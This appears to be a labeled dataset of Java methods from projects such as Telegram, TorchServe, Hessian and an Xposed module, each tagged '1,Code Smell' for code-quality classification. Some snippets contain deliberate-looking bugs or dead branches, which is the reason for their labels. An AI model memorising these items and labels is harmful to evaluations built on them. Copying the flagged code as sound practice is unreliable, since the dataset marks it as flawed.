    SmsTimeLineVo.ItemsVO itemsVO=SmsTimeLineVo.ItemsVO.builder().build();
    for (    SmsRecord smsRecord : entry.getValue()) {
      if (smsRecord.getMessageTemplateId() > 0) {
        itemsVO.setBusinessId(String.valueOf(smsRecord.getMessageTemplateId()));
        itemsVO.setContent(smsRecord.getMsgContent());
        itemsVO.setSendType(EnumUtil.getDescriptionByCode(smsRecord.getStatus(),SmsStatus.class));
        itemsVO.setSendTime(DateUtil.format(new Date(Long.valueOf(smsRecord.getCreated() * 1000L)),DatePattern.NORM_DATETIME_PATTERN));
      }
 else {
        itemsVO.setReceiveType(EnumUtil.getDescriptionByCode(smsRecord.getStatus(),SmsStatus.class));
        itemsVO.setReceiveContent(smsRecord.getReportContent());
        itemsVO.setReceiveTime(DateUtil.format(new Date(Long.valueOf(smsRecord.getUpdated() * 1000L)),DatePattern.NORM_DATETIME_PATTERN));
      }
    }
    itemsVoS.add(itemsVO);
  }
  return smsTimeLineVo;
}",1,Code Smell
"private void clearOperation(RequestInfo currentInfo,boolean preloadChanged,boolean acceptChunksAfterCancel){
  long minOffset=Long.MAX_VALUE;
  int[] waitingDownloadSize=new int[2];
  for (int a=0; a < requestInfos.size(); a++) {
    RequestInfo info=requestInfos.get(a);
    minOffset=Math.min(info.offset,minOffset);
    if (isPreloadVideoOperation) {
      requestedPreloadedBytesRanges.remove(info.offset);
    }
 else {
      removePart(notRequestedBytesRanges,info.offset,info.offset + info.chunkSize);
    }
    if (currentInfo == info) {
      continue;
    }
    if (info.requestToken != 0) {
      info.cancelling=true;
      if (acceptChunksAfterCancel) {
        cancelledRequestInfos.add(info);
        info.whenCancelled=() -> {
          info.whenCancelled=null;
          cancelledRequestInfos.remove(info);
          info.cancelled=true;
        }
;
        ConnectionsManager.getInstance(currentAccount).cancelRequest(info.requestToken,true,() -> {
          if (info.whenCancelled != null) {
            info.whenCancelled.run();
          }
        }
);
      }
 else {
        ConnectionsManager.getInstance(currentAccount).cancelRequest(info.requestToken,true);
        info.cancelled=true;
      }
    }
  }
  for (int i=0; i < 2; i++) {
    int connectionType=i == 0 ? ConnectionsManager.ConnectionTypeDownload : ConnectionsManager.ConnectionTypeDownload2;
    if (waitingDownloadSize[i] > 512 * 1024 * 2) {
      int datacenterId=isCdn ? cdnDatacenterId : this.datacenterId;
      ConnectionsManager.getInstance(currentAccount).discardConnection(datacenterId,connectionType);
    }
  }
  requestInfos.clear();
  for (int a=0; a < delayedRequestInfos.size(); a++) {
    RequestInfo info=delayedRequestInfos.get(a);
    if (isPreloadVideoOperation) {
      requestedPreloadedBytesRanges.remove(info.offset);
    }
 else {
      removePart(notRequestedBytesRanges,info.offset,info.offset + info.chunkSize);
    }
    if (info.response != null) {
      info.response.disableFree=false;
      info.response.freeResources();
    }
 else     if (info.responseWeb != null) {
      info.responseWeb.disableFree=false;
      info.responseWeb.freeResources();
    }
 else     if (info.responseCdn != null) {
      info.responseCdn.disableFree=false;
      info.responseCdn.freeResources();
    }
    minOffset=Math.min(info.offset,minOffset);
  }
  delayedRequestInfos.clear();
  requestsCount=0;
  if (!preloadChanged && isPreloadVideoOperation) {
    requestedBytesCount=totalPreloadedBytes;
  }
 else   if (notLoadedBytesRanges == null) {
    requestedBytesCount=downloadedBytes=minOffset;
  }
}",1,Code Smell
"private void processBitmap(Bitmap bitmap,MessageObject avatarObject){
  if (bitmap == null) {
    return;
  }
  uploadedVideo=null;
  uploadedPhoto=null;
  convertingVideo=null;
  videoPath=null;
  vectorMarkup=avatarObject == null ? null : avatarObject.emojiMarkup;
  bigPhoto=ImageLoader.scaleAndSaveImage(bitmap,800,800,80,false,320,320);
  smallPhoto=ImageLoader.scaleAndSaveImage(bitmap,150,150,80,false,150,150);
  if (smallPhoto != null) {
    try {
      Bitmap b=BitmapFactory.decodeFile(FileLoader.getInstance(currentAccount).getPathToAttach(smallPhoto,true).getAbsolutePath());
      String key=smallPhoto.location.volume_id + ""_"" + smallPhoto.location.local_id+ ""@50_50"";
      ImageLoader.getInstance().putImageToCache(new BitmapDrawable(b),key,true);
    }
 catch (    Throwable ignore) {
    }
  }
  bitmap.recycle();
  if (bigPhoto != null) {
    UserConfig.getInstance(currentAccount).saveConfig(false);
    uploadingImage=FileLoader.getDirectory(FileLoader.MEDIA_DIR_CACHE) + ""/"" + bigPhoto.location.volume_id+ ""_""+ bigPhoto.location.local_id+ "".jpg"";
    if (uploadAfterSelect) {
      if (avatarObject != null && avatarObject.videoEditedInfo != null) {
        if (supportEmojiMarkup && !MessagesController.getInstance(currentAccount).uploadMarkupVideo) {
          if (delegate != null) {
            delegate.didStartUpload(true);
          }
          if (delegate != null) {
            delegate.didUploadPhoto(null,null,0,null,bigPhoto,smallPhoto,isVideo,null);
            delegate.didUploadPhoto(null,null,videoTimestamp,videoPath,bigPhoto,smallPhoto,isVideo,vectorMarkup);
            cleanup();
          }
          return;
        }
        convertingVideo=avatarObject;
        long startTime=avatarObject.videoEditedInfo.startTime < 0 ? 0 : avatarObject.videoEditedInfo.startTime;
        videoTimestamp=(avatarObject.videoEditedInfo.avatarStartTime - startTime) / 1000000.0;
        avatarObject.videoEditedInfo.shouldLimitFps=false;
        NotificationCenter.getInstance(currentAccount).addObserver(ImageUpdater.this,NotificationCenter.filePreparingStarted);
        NotificationCenter.getInstance(currentAccount).addObserver(ImageUpdater.this,NotificationCenter.filePreparingFailed);
        NotificationCenter.getInstance(currentAccount).addObserver(ImageUpdater.this,NotificationCenter.fileNewChunkAvailable);
        MediaController.getInstance().scheduleVideoConvert(avatarObject,true,true);
        uploadingImage=null;
        if (delegate != null) {
          delegate.didStartUpload(true);
        }
        isVideo=true;
      }
 else {
        if (delegate != null) {
          delegate.didStartUpload(false);
        }
        isVideo=false;
      }
      NotificationCenter.getInstance(currentAccount).addObserver(ImageUpdater.this,NotificationCenter.fileUploaded);
      NotificationCenter.getInstance(currentAccount).addObserver(ImageUpdater.this,NotificationCenter.fileUploadProgressChanged);
      NotificationCenter.getInstance(currentAccount).addObserver(ImageUpdater.this,NotificationCenter.fileUploadFailed);
      if (uploadingImage != null) {
        FileLoader.getInstance(currentAccount).uploadFile(uploadingImage,false,true,ConnectionsManager.FileTypePhoto);
      }
    }
    if (delegate != null) {
      delegate.didUploadPhoto(null,null,0,null,bigPhoto,smallPhoto,isVideo,null);
    }
  }
}",1,Code Smell
"/** 
 * @param message: a response of a batch inference requests
 * @return - true: either a non-stream response or last stream response is sent - false: astream response (not include the last stream) is sent
 */
@Override public boolean sendResponse(ModelWorkerResponse message){
  if (message.getCode() == 200) {
    if (message.getPredictions().isEmpty()) {
      for (      Map.Entry<String,Job> j : jobs.entrySet()) {
        Job job=j.getValue();
        if (job.isControlCmd()) {
          cleanJobs();
          return true;
        }
      }
    }
    for (    Predictions prediction : message.getPredictions()) {
      String jobId=prediction.getRequestId();
      Job job=jobs.get(jobId);
      if (job == null) {
        throw new IllegalStateException(""Unexpected job in sendResponse() with 200 status code: "" + jobId);
      }
      if (job.getPayload().getClientExpireTS() > System.currentTimeMillis()) {
        job.response(prediction.getResp(),prediction.getContentType(),prediction.getStatusCode(),prediction.getReasonPhrase(),prediction.getHeaders());
      }
 else {
        logger.warn(""Drop response for inference request {} due to client timeout"",job.getPayload().getRequestId());
      }
      String streamNext=prediction.getHeaders().get(org.pytorch.serve.util.messages.RequestInput.TS_STREAM_NEXT);
      if (streamNext == null || (streamNext != null && streamNext.equals(""false""))) {
        jobs.remove(jobId);
      }
 else       if (!job.isOpen()) {
        jobs.remove(job.getJobId());
        logger.info(""Connection to client got closed; Removing job: {}"",job.getPayload().getRequestId());
      }
 else {
        job.getPayload().setCachedInBackend(true);
      }
    }
  }
 else {
    for (    Map.Entry<String,Job> j : jobs.entrySet()) {
      if (j.getValue() == null) {
        throw new IllegalStateException(""Unexpected job in sendResponse() with non 200 status code: "" + j.getKey());
      }
      Job job=j.getValue();
      if (job.getPayload().getClientExpireTS() > System.currentTimeMillis()) {
        job.sendError(message.getCode(),message.getMessage());
      }
 else {
        logger.warn(""Drop error response for inference request {} due to client timeout"",job.getPayload().getRequestId());
      }
    }
    cleanJobs();
  }
  return true;
}",1,Code Smell
"/** 
 * 鐢绘彁绀烘枃鏈�
 */
private void drawTipText(Canvas canvas){
  if (TextUtils.isEmpty(mTipText) || mTipTextSl == null) {
    return;
  }
  if (mIsTipTextBelowRect) {
    if (mIsShowTipBackground) {
      mPaint.setColor(mTipBackgroundColor);
      mPaint.setStyle(Paint.Style.FILL);
      if (mIsShowTipTextAsSingleLine) {
        Rect tipRect=new Rect();
        mTipPaint.getTextBounds(mTipText,0,mTipText.length(),tipRect);
        float left=(canvas.getWidth() - tipRect.width()) / 2 - mTipBackgroundRadius;
        canvas.drawRoundRect(new RectF(left,mFramingRect.bottom + mTipTextMargin - mTipBackgroundRadius,left + tipRect.width() + 2 * mTipBackgroundRadius,mFramingRect.bottom + mTipTextMargin + mTipTextSl.getHeight()+ mTipBackgroundRadius),mTipBackgroundRadius,mTipBackgroundRadius,mPaint);
      }
 else {
        canvas.drawRoundRect(new RectF(mFramingRect.left,mFramingRect.bottom + mTipTextMargin - mTipBackgroundRadius,mFramingRect.right,mFramingRect.bottom + mTipTextMargin + mTipTextSl.getHeight()+ mTipBackgroundRadius),mTipBackgroundRadius,mTipBackgroundRadius,mPaint);
      }
    }
    canvas.save();
    if (mIsShowTipTextAsSingleLine) {
      canvas.translate(0,mFramingRect.bottom + mTipTextMargin);
    }
 else {
      canvas.translate(mFramingRect.left + mTipBackgroundRadius,mFramingRect.bottom + mTipTextMargin);
    }
    mTipTextSl.draw(canvas);
    canvas.restore();
  }
 else {
    if (mIsShowTipBackground) {
      mPaint.setColor(mTipBackgroundColor);
      mPaint.setStyle(Paint.Style.FILL);
      if (mIsShowTipTextAsSingleLine) {
        Rect tipRect=new Rect();
        mTipPaint.getTextBounds(mTipText,0,mTipText.length(),tipRect);
        float left=(canvas.getWidth() - tipRect.width()) / 2 - mTipBackgroundRadius;
        canvas.drawRoundRect(new RectF(left,mFramingRect.top - mTipTextMargin - mTipTextSl.getHeight()- mTipBackgroundRadius,left + tipRect.width() + 2 * mTipBackgroundRadius,mFramingRect.top - mTipTextMargin + mTipBackgroundRadius),mTipBackgroundRadius,mTipBackgroundRadius,mPaint);
      }
 else {
        canvas.drawRoundRect(new RectF(mFramingRect.left,mFramingRect.top - mTipTextMargin - mTipTextSl.getHeight()- mTipBackgroundRadius,mFramingRect.right,mFramingRect.top - mTipTextMargin + mTipBackgroundRadius),mTipBackgroundRadius,mTipBackgroundRadius,mPaint);
      }
    }
    canvas.save();
    if (mIsShowTipTextAsSingleLine) {
      canvas.translate(0,mFramingRect.top - mTipTextMargin - mTipTextSl.getHeight());
    }
 else {
      canvas.translate(mFramingRect.left + mTipBackgroundRadius,mFramingRect.top - mTipTextMargin - mTipTextSl.getHeight());
    }
    mTipTextSl.draw(canvas);
    canvas.restore();
  }
}",1,Code Smell
"/** 
 * Returns the elf symbol with the specified name or null if one is not found. 
 */
public ElfSymbol getELFSymbol(String symbolName) throws ElfException, IOException {
  if (symbolName == null)   return null;
  ElfSection sh=getDynamicSymbolTableSection();
  if (sh != null) {
    int numSymbols=sh.getNumberOfSymbols();
    for (int i=0; i < Math.ceil(numSymbols / 2d); i++) {
      ElfSymbol symbol=sh.getELFSymbol(i);
      if (symbolName.equals(symbol.getName())) {
        return symbol;
      }
 else       if (symbolName.equals((symbol=sh.getELFSymbol(numSymbols - 1 - i)).getName())) {
        return symbol;
      }
    }
  }
  sh=getSymbolTableSection();
  if (sh != null) {
    int numSymbols=sh.getNumberOfSymbols();
    for (int i=0; i < Math.ceil(numSymbols / 2d); i++) {
      ElfSymbol symbol=sh.getELFSymbol(i);
      if (symbolName.equals(symbol.getName())) {
        return symbol;
      }
 else       if (symbolName.equals((symbol=sh.getELFSymbol(numSymbols - 1 - i)).getName())) {
        return symbol;
      }
    }
  }
  return null;
}
/** 
 * Returns the elf symbol with the specified address or null if one is not found. 'address' is relative to base of shared object for .so's.
 */
public ElfSymbol getELFSymbol(long address) throws ElfException, IOException {
  ElfSymbol symbol;
  long value;
  ElfSection sh=getDynamicSymbolTableSection();
  if (sh != null) {
    int numSymbols=sh.getNumberOfSymbols();
    for (int i=0; i < numSymbols; i++) {
      symbol=sh.getELFSymbol(i);
      value=symbol.value;
      if (address >= value && address < value + symbol.size)       return symbol;
    }
  }
  sh=getSymbolTableSection();
  if (sh != null) {
    int numSymbols=sh.getNumberOfSymbols();
    for (int i=0; i < numSymbols; i++) {
      symbol=sh.getELFSymbol(i);
      value=symbol.value;
      if (address >= value && address < value + symbol.size)       return symbol;
    }
  }
  return null;
}",1,Code Smell
"/** 
 * Replace instances of ""^1"", ""^2"", etc. in the <code>template</code> CharSequence with the corresponding <code>values</code>.  ""^^"" is used to produce a single caret in the output.  Only up to 9 replacement values are supported, ""^10"" will be produce the first replacement value followed by a '0'.
 * @param template the input text containing ""^1""-styleplaceholder values.  This object is not modified; a copy is returned.
 * @param values CharSequences substituted into the template.  Thefirst is substituted for ""^1"", the second for ""^2"", and so on.
 * @return the new CharSequence produced by doing the replacement
 * @throws IllegalArgumentException if the template requests avalue that was not provided, or if more than 9 values are provided.
 */
public static CharSequence expandTemplate(CharSequence template,CharSequence... values){
  if (values.length > 9) {
    throw new IllegalArgumentException(""max of 9 values are supported"");
  }
  SpannableStringBuilder ssb=new SpannableStringBuilder(template);
  try {
    int i=0;
    while (i < ssb.length()) {
      if (ssb.charAt(i) == '^') {
        char next=ssb.charAt(i + 1);
        if (next == '^') {
          ssb.delete(i + 1,i + 2);
          ++i;
          continue;
        }
 else         if (Character.isDigit(next)) {
          int which=Character.getNumericValue(next) - 1;
          if (which < 0) {
            throw new IllegalArgumentException(""template requests value ^"" + (which + 1));
          }
          if (which >= values.length) {
            throw new IllegalArgumentException(""template requests value ^"" + (which + 1) + ""; only ""+ values.length+ "" provided"");
          }
          ssb.replace(i,i + 2,values[which]);
          i+=values[which].length();
          continue;
        }
      }
      ++i;
    }
  }
 catch (  IndexOutOfBoundsException ignore) {
  }
  return ssb;
}",1,Code Smell
"/** 
 * Sorts move instructions added via  {@code addMoveToEnd} duringphi removal so that results don't overwrite sources that are used. For use after all phis have been removed and all calls to addMoveToEnd() have been made.<p> This is necessary because copy-propogation may have left us in a state where the same basic block has the same register as a phi operand and a result. In this case, the register in the phi operand always refers value before any other phis have executed.
 */
public void scheduleMovesFromPhis(){
  if (movesFromPhisAtBeginning > 1) {
    List<SsaInsn> toSchedule;
    toSchedule=insns.subList(0,movesFromPhisAtBeginning);
    scheduleUseBeforeAssigned(toSchedule);
    SsaInsn firstNonPhiMoveInsn=insns.get(movesFromPhisAtBeginning);
    if (firstNonPhiMoveInsn.isMoveException()) {
      if (true) {
        throw new RuntimeException(""Unexpected: moves from "" + ""phis before move-exception"");
      }
 else {
        boolean moveExceptionInterferes=false;
        int moveExceptionResult=firstNonPhiMoveInsn.getResult().getReg();
        for (        SsaInsn insn : toSchedule) {
          if (insn.isResultReg(moveExceptionResult) || insn.isRegASource(moveExceptionResult)) {
            moveExceptionInterferes=true;
            break;
          }
        }
        if (!moveExceptionInterferes) {
          insns.remove(movesFromPhisAtBeginning);
          insns.add(0,firstNonPhiMoveInsn);
        }
 else {
          RegisterSpec originalResultSpec=firstNonPhiMoveInsn.getResult();
          int spareRegister=parent.borrowSpareRegister(originalResultSpec.getCategory());
          firstNonPhiMoveInsn.changeResultReg(spareRegister);
          RegisterSpec tempSpec=firstNonPhiMoveInsn.getResult();
          insns.add(0,firstNonPhiMoveInsn);
          NormalSsaInsn toAdd=new NormalSsaInsn(new PlainInsn(Rops.opMove(tempSpec.getType()),SourcePosition.NO_INFO,originalResultSpec,RegisterSpecList.make(tempSpec)),this);
          insns.set(movesFromPhisAtBeginning + 1,toAdd);
        }
      }
    }
  }
  if (movesFromPhisAtEnd > 1) {
    scheduleUseBeforeAssigned(insns.subList(insns.size() - movesFromPhisAtEnd - 1,insns.size() - 1));
  }
  parent.returnSpareRegisters();
}",1,Code Smell
"@Override public void run(){
  String errString=null;
  mainblock: {
    String param=getParameter(input);
    Log.d(TAG,""MLSD parameter: "" + param);
    File fileToList=null;
    if (param.equals("""")) {
      fileToList=sessionThread.getWorkingDir();
    }
 else {
      if (param.contains(""*"")) {
        errString=""550 MLSD does not support wildcards\r\n"";
        break mainblock;
      }
      fileToList=new File(sessionThread.getWorkingDir(),param);
      if (violatesChroot(fileToList)) {
        errString=""450 MLSD target violates chroot\r\n"";
        break mainblock;
      }
    }
    String listing;
    if (!fileToList.isDirectory()) {
      errString=""501 Not a directory\r\n"";
      break mainblock;
    }
    StringBuilder response=new StringBuilder();
    errString=listDirectory(response,fileToList);
    if (errString != null) {
      break mainblock;
    }
    listing=response.toString();
    errString=sendListing(listing);
    if (errString != null) {
      break mainblock;
    }
  }
  if (errString != null) {
    sessionThread.writeString(errString);
    Log.d(TAG,""MLSD failed with: "" + errString);
  }
 else {
    Log.d(TAG,""MLSD completed OK"");
  }
}",1,Code Smell
"@AnyThread public void loadPackages(){
  mExecutor.submit(() -> {
    loadDebloatObjects();
    List<DebloatObject> debloatObjects=new ArrayList<>();
    if (mFilterFlags != DebloaterListOptions.FILTER_NO_FILTER) {
      for (      DebloatObject debloatObject : mDebloatObjects) {
        if ((mFilterFlags & DebloaterListOptions.FILTER_LIST_AOSP) == 0 && debloatObject.type.equals(""aosp"")) {
          continue;
        }
        if ((mFilterFlags & DebloaterListOptions.FILTER_LIST_CARRIER) == 0 && debloatObject.type.equals(""carrier"")) {
          continue;
        }
        if ((mFilterFlags & DebloaterListOptions.FILTER_LIST_GOOGLE) == 0 && debloatObject.type.equals(""google"")) {
          continue;
        }
        if ((mFilterFlags & DebloaterListOptions.FILTER_LIST_MISC) == 0 && debloatObject.type.equals(""misc"")) {
          continue;
        }
        if ((mFilterFlags & DebloaterListOptions.FILTER_LIST_OEM) == 0 && debloatObject.type.equals(""oem"")) {
          continue;
        }
        if ((mFilterFlags & DebloaterListOptions.FILTER_LIST_PENDING) == 0 && debloatObject.type.equals(""pending"")) {
          continue;
        }
        int removalType=debloatObject.getRemoval();
        if ((mFilterFlags & DebloaterListOptions.FILTER_REMOVAL_SAFE) == 0 && removalType == DebloatObject.REMOVAL_SAFE) {
          continue;
        }
        if ((mFilterFlags & DebloaterListOptions.FILTER_REMOVAL_REPLACE) == 0 && removalType == DebloatObject.REMOVAL_REPLACE) {
          continue;
        }
        if ((mFilterFlags & DebloaterListOptions.FILTER_REMOVAL_CAUTION) == 0 && removalType == DebloatObject.REMOVAL_CAUTION) {
          continue;
        }
        if ((mFilterFlags & DebloaterListOptions.FILTER_INSTALLED_APPS) != 0 && !debloatObject.isInstalled()) {
          continue;
        }
        if ((mFilterFlags & DebloaterListOptions.FILTER_UNINSTALLED_APPS) != 0 && debloatObject.isInstalled()) {
          continue;
        }
        if ((mFilterFlags & DebloaterListOptions.FILTER_USER_APPS) != 0 && !debloatObject.isUserApp()) {
          continue;
        }
        if ((mFilterFlags & DebloaterListOptions.FILTER_SYSTEM_APPS) != 0 && !debloatObject.isSystemApp()) {
          continue;
        }
        debloatObjects.add(debloatObject);
      }
    }
    if (TextUtils.isEmpty(mQueryString)) {
      mDebloatObjectListLiveData.postValue(debloatObjects);
      return;
    }
    List<DebloatObject> newList=AdvancedSearchView.matches(mQueryString,debloatObjects,(AdvancedSearchView.ChoicesGenerator<DebloatObject>)item -> {
      CharSequence label=item.getLabel();
      if (label != null) {
        return Arrays.asList(item.packageName,label.toString().toLowerCase(Locale.getDefault()));
      }
 else {
        return Collections.singletonList(item.packageName);
      }
    }
,mQueryType);
    mDebloatObjectListLiveData.postValue(newList);
  }
);
}",1,Code Smell
"private void selectChatsFor(boolean include){
  ArrayList<Long> arrayList=include ? newAlwaysShow : newNeverShow;
  UsersSelectActivity fragment=new UsersSelectActivity(include,arrayList,newFilterFlags);
  fragment.noChatTypes=filter.isChatlist();
  fragment.setDelegate((ids,flags) -> {
    newFilterFlags=flags;
    if (include) {
      onUpdate(true,newAlwaysShow,ids);
      newAlwaysShow=ids;
      for (int a=0; a < newAlwaysShow.size(); a++) {
        newNeverShow.remove(newAlwaysShow.get(a));
      }
      ArrayList<Long> toRemove=new ArrayList<>();
      for (int a=0, N=newPinned.size(); a < N; a++) {
        Long did=newPinned.keyAt(a);
        if (DialogObject.isEncryptedDialog(did)) {
          continue;
        }
        if (newAlwaysShow.contains(did)) {
          continue;
        }
        toRemove.add(did);
      }
      for (int a=0, N=toRemove.size(); a < N; a++) {
        newPinned.delete(toRemove.get(a));
      }
    }
 else {
      onUpdate(false,newNeverShow,ids);
      newNeverShow=ids;
      for (int a=0; a < newNeverShow.size(); a++) {
        Long id=newNeverShow.get(a);
        newAlwaysShow.remove(id);
        newPinned.delete(id);
      }
    }
    fillFilterName();
    checkDoneButton(false);
    updateRows();
  }
);
  presentFragment(fragment);
}",1,Code Smell
"private void updateVisibleRows(int mask){
  updateVisibleRows(mask,true);
}
private void updateVisibleRows(int mask,boolean animated){
  if ((dialogsListFrozen && (mask & MessagesController.UPDATE_MASK_REORDER) == 0) || isPaused) {
    return;
  }
  for (int c=0; c < 3; c++) {
    RecyclerListView list;
    ViewPage viewPage=null;
    if (c == 2) {
      list=searchViewPager != null ? searchViewPager.searchListView : null;
    }
 else     if (viewPages != null) {
      list=c < viewPages.length ? viewPages[c].listView : null;
      if (list != null && viewPages[c].getVisibility() != View.VISIBLE) {
        continue;
      }
      if (list != null) {
        viewPage=viewPages[c];
      }
    }
 else {
      continue;
    }
    if (list == null || list.getAdapter() == null) {
      continue;
    }
    if ((mask & MessagesController.UPDATE_MASK_NEW_MESSAGE) != 0 || mask == 0) {
      if (viewPage != null) {
        viewPage.updateList(false);
        continue;
      }
    }
    int count=list.getChildCount();
    for (int a=0; a < count; a++) {
      View child=list.getChildAt(a);
      if (child instanceof DialogCell) {
        if (list.getAdapter() != searchViewPager.dialogsSearchAdapter) {
          DialogCell cell=(DialogCell)child;
          if ((mask & MessagesController.UPDATE_MASK_REORDER) != 0) {
            cell.onReorderStateChanged(actionBar.isActionModeShowed(),true);
            if (dialogsListFrozen) {
              continue;
            }
          }
          if ((mask & MessagesController.UPDATE_MASK_CHECK) != 0) {
            cell.setChecked(false,(mask & MessagesController.UPDATE_MASK_CHAT) != 0);
          }
 else {
            if ((mask & MessagesController.UPDATE_MASK_SELECT_DIALOG) != 0) {
              if (viewPages[c].isDefaultDialogType() && AndroidUtilities.isTablet()) {
                cell.setDialogSelected(cell.getDialogId() == openedDialogId.dialogId);
              }
            }
 else {
              if (cell.update(mask,animated)) {
                viewPage.updateList(false);
                break;
              }
            }
            if (selectedDialogs != null) {
              cell.setChecked(selectedDialogs.contains(cell.getDialogId()),false);
            }
          }
        }
      }
      if (child instanceof UserCell) {
        ((UserCell)child).update(mask);
      }
 else       if (child instanceof ProfileSearchCell) {
        ProfileSearchCell cell=(ProfileSearchCell)child;
        cell.update(mask);
        if (selectedDialogs != null) {
          cell.setChecked(selectedDialogs.contains(cell.getDialogId()),false);
        }
      }
      if (dialogsListFrozen) {
        continue;
      }
      if (child instanceof RecyclerListView) {
        RecyclerListView innerListView=(RecyclerListView)child;
        int count2=innerListView.getChildCount();
        for (int b=0; b < count2; b++) {
          View child2=innerListView.getChildAt(b);
          if (child2 instanceof HintDialogCell) {
            ((HintDialogCell)child2).update(mask);
          }
        }
      }
    }
  }
}",1,Code Smell
"public Object readList(AbstractHessianInput in,int length) throws IOException {
  Collection list=createList();
  in.addRef(list);
  try {
    Class clasz=list.getClass();
    Set<String> fieldNameSet=new HashSet<String>();
    for (; !clasz.getName().startsWith(""java.""); clasz=clasz.getSuperclass()) {
      boolean impListOrSet=false;
      for (      Class c : clasz.getInterfaces()) {
        if (List.class.equals(c) | Set.class.equals(c) | SortedSet.class.equals(c)| Collection.class.equals(c)) {
          impListOrSet=true;
          break;
        }
      }
      if (impListOrSet) {
        continue;
      }
      Class sc=clasz.getSuperclass();
      if (AbstractList.class.equals(sc) | AbstractSet.class.equals(sc) | AbstractCollection.class.equals(sc)) {
        continue;
      }
      Field[] fields=clasz.getDeclaredFields();
      for (      Field field : fields) {
        if (fieldNameSet.contains(field.getName())) {
          continue;
        }
        if (Modifier.isTransient(field.getModifiers()) || Modifier.isStatic(field.getModifiers())) {
          continue;
        }
        boolean isAccessible=field.isAccessible();
        if (!isAccessible) {
          field.setAccessible(true);
        }
        Object val=in.readObject();
        field.set(list,val);
        field.setAccessible(isAccessible);
        fieldNameSet.add(field.getName());
      }
    }
    fieldNameSet.clear();
  }
 catch (  IllegalAccessException e) {
    throw new IOException(e.getMessage());
  }
  while (!in.isEnd())   list.add(in.readObject());
  in.readEnd();
  return list;
}
",1,Code Smell
"private static int helper(int[][] arr,int n,int k,int p){
  int[][] preSum=new int[n][k];
  for (int i=0; i < n; i++) {
    preSum[i][0]=arr[i][0];
  }
  for (int i=0; i < n; i++) {
    for (int j=1; j < k; j++) {
      preSum[i][j]=arr[i][j] + preSum[i][j - 1];
    }
  }
  for (  int[] a : preSum) {
    System.out.println(Arrays.toString(a));
  }
  PriorityQueue<int[]> pq=new PriorityQueue<>((a,b) -> {
    if (a[2] == b[2])     return a[3] - b[3];
    return a[2] - b[2];
  }
);
  PriorityQueue<int[]> result=new PriorityQueue<>((a,b) -> {
    return a[3] - b[3];
  }
);
  for (int i=0; i < preSum.length; i++) {
    for (int j=0; j < preSum[0].length; j++) {
      pq.add(new int[]{i,j,(int)preSum[i][j],j + 1});
    }
  }
  int max=Integer.MIN_VALUE;
  int count=0;
  int cost=0;
  while (!pq.isEmpty()) {
    int[] temp=pq.poll();
    cost+=temp[2];
    count=+temp[3];
    result.add(temp);
    if (count > k) {
      while (!result.isEmpty() && count > k) {
        int[] temp2=result.poll();
        cost-=temp2[2];
        count-=temp2[3];
      }
    }
    if (count == k) {
      max=Math.max(max,cost);
    }
  }
  return max;
}",1,Code Smell
"static private BSPNode handleIntersecting(BSPWorkspace workspace,IntArrayList indexes,int depth,BSPNode oldNode){
  Int2IntOpenHashMap intersectionCounts=null;
  IntOpenHashSet primaryIntersectorIndexes=null;
  int primaryIntersectorThreshold=Mth.clamp(indexes.size() / 2,2,4);
  int i=-1;
  int j=0;
  final int quadCount=indexes.size();
  int stepSize=Math.max(1,(quadCount * (quadCount - 1) / 2) / MAX_INTERSECTION_ATTEMPTS);
  int variance=0;
  Random random=null;
  if (stepSize > 1) {
    int half=stepSize / 2;
    stepSize=Math.max(1,stepSize - half);
    variance=stepSize;
    random=new Random();
  }
  while (true) {
    i+=stepSize;
    if (variance > 0) {
      i+=random.nextInt(variance);
    }
    while (i >= j) {
      i-=j;
      j++;
    }
    if (j >= indexes.size()) {
      break;
    }
    var quadA=workspace.quads[indexes.getInt(i)];
    var quadB=workspace.quads[indexes.getInt(j)];
    if (TQuad.extentsIntersect(quadA,quadB)) {
      if (intersectionCounts == null) {
        intersectionCounts=new Int2IntOpenHashMap();
      }
      int aCount=intersectionCounts.get(i) + 1;
      intersectionCounts.put(i,aCount);
      int bCount=intersectionCounts.get(j) + 1;
      intersectionCounts.put(j,bCount);
      if (aCount >= primaryIntersectorThreshold) {
        if (primaryIntersectorIndexes == null) {
          primaryIntersectorIndexes=new IntOpenHashSet(2);
        }
        primaryIntersectorIndexes.add(i);
      }
      if (bCount >= primaryIntersectorThreshold) {
        if (primaryIntersectorIndexes == null) {
          primaryIntersectorIndexes=new IntOpenHashSet(2);
        }
        primaryIntersectorIndexes.add(j);
      }
      if (primaryIntersectorIndexes != null && primaryIntersectorIndexes.size() == indexes.size()) {
        return new LeafMultiBSPNode(BSPSortState.compressIndexes(indexes));
      }
    }
  }
  if (primaryIntersectorIndexes != null) {
    var nonPrimaryIntersectors=new IntArrayList(indexes.size() - primaryIntersectorIndexes.size());
    var primaryIntersectorQuadIndexes=new IntArrayList(primaryIntersectorIndexes.size());
    for (int k=0; k < indexes.size(); k++) {
      if (primaryIntersectorIndexes.contains(k)) {
        primaryIntersectorQuadIndexes.add(indexes.getInt(k));
      }
 else {
        nonPrimaryIntersectors.add(indexes.getInt(k));
      }
    }
    return InnerFixedDoubleBSPNode.buildFromParts(workspace,indexes,depth,oldNode,nonPrimaryIntersectors,primaryIntersectorQuadIndexes);
  }
  return null;
}",1,Code Smell
"@Override protected void before(MethodHookParam param){
  boolean useCC=(boolean)XposedHelpers.callMethod(XposedHelpers.getObjectField(param.thisObject,""mPanelController""),""isExpandable"");
  if (useCC) {
    FrameLayout bar=(FrameLayout)param.thisObject;
    Object mControlPanelWindowManager=XposedHelpers.getObjectField(param.thisObject,""mControlPanelWindowManager"");
    boolean dispatchToControlPanel=(boolean)XposedHelpers.callMethod(mControlPanelWindowManager,""dispatchToControlPanel"",param.args[0],bar.getWidth());
    if (isMoreHyperOSVersion(1f) && isAndroidVersion(34)) {
      XposedHelpers.setObjectField(mControlPanelWindowManager,""transToControlPanel"",dispatchToControlPanel);
    }
 else     if (isAndroidVersion(34)) {
      XposedHelpers.setObjectField(mControlPanelWindowManager,""mTransToControlPanel"",dispatchToControlPanel);
    }
 else {
      XposedHelpers.callMethod(mControlPanelWindowManager,""setTransToControlPanel"",dispatchToControlPanel);
    }
    param.setResult(dispatchToControlPanel);
    return;
  }
  param.setResult(false);
}
@Override protected void before(MethodHookParam param){
  boolean added=XposedHelpers.getBooleanField(param.thisObject,""added"");
  if (added) {
    boolean useCC;
    Object controlCenterWindowView;
    if (isMoreHyperOSVersion(1f) && isAndroidVersion(34)) {
      useCC=XposedHelpers.getBooleanField(XposedHelpers.getObjectField(param.thisObject,""controlCenterController""),""useControlCenter"");
    }
